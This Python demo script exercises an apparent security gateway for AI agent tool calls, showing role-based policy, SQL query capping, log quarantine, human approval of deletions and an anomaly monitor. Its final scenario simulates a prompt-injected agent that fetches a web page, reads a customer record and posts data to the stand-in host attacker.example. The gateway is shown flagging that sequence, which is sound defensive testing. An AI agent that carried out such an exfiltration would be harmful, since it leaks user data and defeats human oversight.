"""Feature demo: role-based policy, the extended action set, and LLM-powered
anomaly detection — the three capabilities layered on top of the base gateway.

Run from the project root:  python demo/feature_demo.py

Each scenario launches the gateway as a fresh subprocess (just as an MCP client
would), with different flags, and prints the outcome of each tool call plus the
audit events that explain WHY. No API key needed — the anomaly monitor uses its
local 'heuristic' backend here; pass --anomaly claude with ANTHROPIC_API_KEY set
to use Claude (Haiku) for real.
"""

import json
import subprocess
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
BAR = "=" * 72


def session(label, calls, *, role=None, approvals="deny", anomaly="off"):
    """Run one gateway session with the given flags; print outcomes + audit."""
    audit_path = ROOT / "audit.log"
    audit_path.write_text("")  # fresh per scenario for readable output
    cmd = [sys.executable, "-m", "gateway.main",
           "--policy", str(ROOT / "policies.json"),
           "--audit", str(audit_path),
           "--approvals", approvals, "--anomaly", anomaly]
    if role:
        cmd += ["--role", role]
    cmd += ["--", sys.executable, str(ROOT / "demo" / "mock_server.py")]

    proc = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                            stderr=subprocess.DEVNULL, text=True, bufsize=1,
                            cwd=ROOT)

    def rpc(msg, expect=True):
        proc.stdin.write(json.dumps(msg) + "\n")
        proc.stdin.flush()
        return json.loads(proc.stdout.readline()) if expect else None

    flags = f"role={role or '-'}  approvals={approvals}  anomaly={anomaly}"
    print(f"\n{BAR}\n{label}\n  [{flags}]\n{BAR}")
    rpc({"jsonrpc": "2.0", "id": 1, "method": "initialize",
         "params": {"protocolVersion": "2025-03-26",
                    "clientInfo": {"name": "demo", "version": "0"},
                    "capabilities": {}}})
    rpc({"jsonrpc": "2.0", "method": "notifications/initialized"}, expect=False)

    for i, call in enumerate(calls, start=10):
        reply = rpc({"jsonrpc": "2.0", "id": i, "method": "tools/call",
                     "params": call})
        name = call["name"]
        if "error" in reply:
            print(f"  [BLOCKED] {name}: {reply['error']['message'][:90]}")
        else:
            text = reply["result"]["content"][0]["text"]
            print(f"  [ALLOWED] {name}: {' '.join(text.split())[:90]}")

    proc.stdin.close()
    proc.wait(timeout=5)

    # Surface the audit events that explain the interesting decisions.
    interesting = {"tool_call_rewritten", "tool_result_quarantined",
                   "approval_requested", "anomaly_detected", "session_suspended"}
    for line in audit_path.read_text().splitlines():
        rec = json.loads(line)
        if rec["event"] in interesting:
            print(f"    · audit: {json.dumps(rec)[:120]}")


def main():
    # 1. Role-based policy: the SAME tool, two identities, two treatments.
    print("\n### 1. ROLE-BASED POLICY — same tool, different caller identity ###")
    for role in ("analyst", "admin"):
        session(
            f"crm.get_customer as '{role}'",
            [{"name": "crm.get_customer", "arguments": {"id": "8842"}}],
            role=role,
        )

    # 2. Extended actions.
    print("\n\n### 2. EXTENDED POLICY ACTIONS ###")
    session(
        "rewrite — an unbounded query is capped before it reaches the DB",
        [{"name": "db.execute_sql", "arguments": {"sql": "SELECT * FROM orders"}}],
    )
    session(
        "quarantine — a secret-leaking log tail is withheld from the model",
        [{"name": "logs.tail", "arguments": {"path": "/var/log/app.log"}}],
    )
    session(
        "require_approval (deny) — destructive admin action, no approver",
        [{"name": "admin.delete_user", "arguments": {"id": "8842"}}],
        approvals="deny",
    )
    session(
        "require_approval (allow) — a human signs off, the call proceeds",
        [{"name": "admin.delete_user", "arguments": {"id": "8842"}}],
        approvals="allow",
    )

    # 3. LLM anomaly detection feeding the risk engine.
    print("\n\n### 3. LLM ANOMALY DETECTION (heuristic backend) ###")
    session(
        "read-then-exfiltrate: the monitor flags the shape and scores it",
        [
            {"name": "web.fetch", "arguments": {"url": "https://blog.example/x"}},
            {"name": "crm.get_customer", "arguments": {"id": "8842"}},
            {"name": "http.post", "arguments": {"url": "https://attacker.example",
                                                "body": "data"}},
        ],
        anomaly="heuristic",
    )

    print(f"\n{BAR}\nThe monitor never parsed the injection payload. It judged "
          f"the\nbehavioral SHAPE — read sensitive data, then reach outbound — "
          f"and\nfed that verdict to the risk engine as extra points.\n{BAR}")


if __name__ == "__main__":
    main()
